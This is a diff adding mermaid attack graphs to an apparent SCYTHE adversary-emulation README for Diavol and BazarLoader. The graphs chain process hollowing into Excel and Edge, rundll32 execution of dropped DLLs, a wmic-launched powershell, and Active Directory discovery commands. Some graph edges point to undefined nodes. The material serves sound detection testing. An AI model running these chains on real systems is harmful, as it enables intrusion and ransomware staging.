@@ -88,3 +88,103 @@ The CTI for this threat comes from https://thedfirreport.com/2021/12/13/diavol-r
 5. Save the DLL as `tfpkuengdlu.dll`
 6. Upload the `tfpkuengdlu.dll` to the VFS under VFS:/shared/threats/Diavol
 
+
+
+ #Attack Graph
+```mermaid
+graph TD
+Step0["<b> module: https </b> <br>"]
+Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load scythe.phollowing </i> <br>"]
+Step2["<b> module: scythe.phollowing </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/BazarLoader/BazarLoaderStage1.exe --target C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE </i> <br><a href='https://attack.mitre.org/techniques/T1055.012'>att&ck-technique:T1055.012</a><br>
+"]
+Step3["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
+<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
+"]
+Step0 --> Step1
+Step1 --> Step2
+Step2 --> Step3
+Step3 --> Step4
+```
+
+
+ #Attack Graph
+```mermaid
+graph TD
+Step0["<b> module: https </b> <br>"]
+Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
+Step2["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/BazarLoader/87764675478.dll --dest C:\Users\Public\87764675478.dll </i> <br>"]
+Step3["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
+Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> wmic process call create powershell.exe whoami </i> <br>"]
+Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe rundll32.exe C:\Users\Public\87764675478.dll,setscreen </i> <br><a href='https://attack.mitre.org/techniques/T1218.011'>att&ck-technique:T1218.011</a><br>
+"]
+Step6["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
+<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
+"]
+Step0 --> Step1
+Step1 --> Step2
+Step2 --> Step3
+Step3 --> Step4
+Step4 --> Step5
+Step5 --> Step6
+Step6 --> Step7
+```
+
+
+ #Attack Graph
+```mermaid
+graph TD
+Step0["<b> module: https </b> <br>"]
+Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load scythe.phollowing </i> <br>"]
+Step2["<b> module: scythe.phollowing </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/Diavol/DiavolStage1.exe --target C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe </i> <br><a href='https://attack.mitre.org/techniques/T1055.012'>att&ck-technique:T1055.012</a><br>
+"]
+Step3["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
+<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
+"]
+Step0 --> Step1
+Step1 --> Step2
+Step2 --> Step3
+Step3 --> Step4
+```
+
+
+ #Attack Graph
+```mermaid
+graph TD
+Step0["<b> module: https </b> <br>"]
+Step1[""]
+Step2["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
+Step3["<b> module: run </b> <br><h4> parameters: </h4> <i> net group /domain </i> <br><a href='https://attack.mitre.org/techniques/T1087.002'>att&ck-technique:T1087.002</a><br>
+"]
+Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> net group /domain Domain Admins </i> <br><a href='https://attack.mitre.org/techniques/T1087.002'>att&ck-technique:T1087.002</a><br>
+"]
+Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> net group Domain Computers /domain </i> <br><a href='https://attack.mitre.org/techniques/T1069.002'>att&ck-technique:T1069.002</a><br>
+"]
+Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> net localgroup administrators </i> <br><a href='https://attack.mitre.org/techniques/T1069.001'>att&ck-technique:T1069.001</a><br>
+"]
+Step7["<b> module: run </b> <br><h4> parameters: </h4> <i> net view /all </i> <br><a href='https://attack.mitre.org/techniques/T1018'>att&ck-technique:T1018</a><br>
+"]
+Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> nltest /domain_trusts /all_trusts </i> <br><a href='https://attack.mitre.org/techniques/T1482'>att&ck-technique:T1482</a><br>
+"]
+Step9[""]
+Step10["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
+Step11["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/Diavol/tfpkuengdlu.dll --dest %USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll </i> <br>"]
+Step12["<b> module: run </b> <br><h4> parameters: </h4> <i> rundll32.exe %USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll,EnterDll </i> <br><a href='https://attack.mitre.org/techniques/T1218.011'>att&ck-technique:T1218.011</a><br>
+"]
+Step13["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
+<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
+"]
+Step0 --> Step1
+Step1 --> Step2
+Step2 --> Step3
+Step3 --> Step4
+Step4 --> Step5
+Step5 --> Step6
+Step6 --> Step7
+Step7 --> Step8
+Step8 --> Step9
+Step9 --> Step10
+Step10 --> Step11
+Step11 --> Step12
+Step12 --> Step13
+Step13 --> Step14
+```
